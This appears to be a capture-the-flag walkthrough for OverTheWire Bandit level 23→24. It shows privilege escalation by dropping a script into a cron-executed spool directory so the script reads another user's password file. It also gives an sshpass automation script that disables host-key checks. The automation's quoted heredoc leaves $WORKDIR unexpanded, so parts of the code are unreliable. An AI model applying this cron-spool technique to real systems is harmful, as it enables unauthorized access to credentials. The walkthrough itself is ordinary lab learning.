🐚 Bandit Level 23 → 24

🎯 Objective

On this level, it was required to create a custom shell script to obtain the password. Cron automatically executed all scripts placed in the /var/spool/bandit24/foo directory with the privileges of user bandit24.

The main goal was to learn how to create and use shell scripts for task automation and privilege escalation. 🚀

🔍 Solution Steps

Step 1: Examine the cron configuration:

	cat /etc/cron.d/cronjob_bandit24

It turned out that cron runs a script that executes all files from /var/spool/bandit24/foo with bandit24's privileges.

Step 2: Create a working directory:

	mkdir /tmp/myscript
	cd /tmp/myscript

Step 3: Write a script to obtain the password:

	#!/bin/bash
	cat /etc/bandit_pass/bandit24 > /tmp/myscript/password

Step 4: Copy the script to the cron directory:

	cp myscript.sh /var/spool/bandit24/foo/

Step 5: Wait for the cron job to run (up to 1 minute) and read the obtained password:

	cat /tmp/myscript/password

The password for the next level was successfully obtained. 🎉

💻 Commands Used

	mkdir /tmp/myscript
	cd /tmp/myscript
	echo '#!/bin/bash' > myscript.sh
	echo 'cat /etc/bandit_pass/bandit24 > /tmp/myscript/password' >> myscript.sh
	chmod +x myscript.sh
	cp myscript.sh /var/spool/bandit24/foo/
	cat /tmp/myscript/password


🤖 Automation

	#!/bin/bash

	PASSWORD=$1
	HOST="bandit.labs.overthewire.org"
	PORT=2220
	USER="bandit23"

	CMD="
	WORKDIR=\"/tmp/myscript_\$(date +%s)\"
	mkdir -p \$WORKDIR
	cat > \$WORKDIR/script.sh << 'EOF'
	#!/bin/bash
	cat /etc/bandit_pass/bandit24 > \$WORKDIR/password
	EOF
	chmod +x \$WORKDIR/script.sh
	cp \$WORKDIR/script.sh /var/spool/bandit24/foo/
	sleep 60
	cat \$WORKDIR/password
	"

	sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no -p $PORT $USER@$HOST "$CMD"

🧰 Tools Used

cron — automatic task execution. ⏰

bash — creating shell scripts. 🖥️

chmod — managing execute permissions. 🔧

/var/spool/bandit24/foo/ — directory for automatic execution. 📂

📚 Skills Acquired

creating custom shell scripts; ✍️

understanding how cron and spool directories work; 🧩

automating tasks using the scheduler; ⚡

privilege escalation through cron jobs; 🔐

working with temporary directories. 📁
